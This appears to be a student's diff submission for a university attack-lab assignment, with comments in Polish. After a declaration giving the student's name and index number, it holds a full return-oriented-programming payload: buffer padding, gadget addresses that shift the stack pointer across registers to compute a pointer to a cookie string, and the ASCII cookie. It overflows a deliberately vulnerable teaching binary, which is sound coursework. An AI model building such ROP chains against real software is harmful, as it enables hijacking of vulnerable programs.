@@ -1,0 +1,29 @@
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Kacper Bajkiewicz, 314438
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+ */
+
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+c6 1d 40 00 00 00 00 00 /* przenosimy rsp do rax (bo nie ma instrukcji która przeniesie do rdi) addval_255 */
+be 1c 40 00 00 00 00 00 /* przenosimy wartość z raxa do rdi, rsp mamy w rdi, trzeba się dostać do względnego adresu ciasteczka getval_192 */
+c5 1c 40 00 00 00 00 00 /* wrzucamy ją do raxa żeby odholować ją do rsi addval__471 */
+48 00 00 00 00 00 00 00 /* tutaj mamy wartość względnej pozycji ciasteczka */
+/* do rsi da się dostać przez edx a nie przez raxa :(, najpierw trzeba rax -> rdx */
+/* no ale z raxa nie można bezpośrednio do rdxa, można rax -> rcx i rcx -> rdx */
+a4 1d 40 00 00 00 00 00 /* eax -> ecx, setval_153 */
+45 1d 40 00 00 00 00 00 /* ecx -> edx, setval_412 */
+17 1d 40 00 00 00 00 00 /* ecx -> esi, getval_334 */ 
+f1 1c 40 00 00 00 00 00 /* teraz dodajemy rdi z rsi, wynik w raxie, add_xy */
+be 1c 40 00 00 00 00 00 /* i rax ląduje w rdi, voila! */
+22 1c 40 00 00 00 00 00
+32 31 64 31 32 65 30 65 /* ciasteczko w ascii */
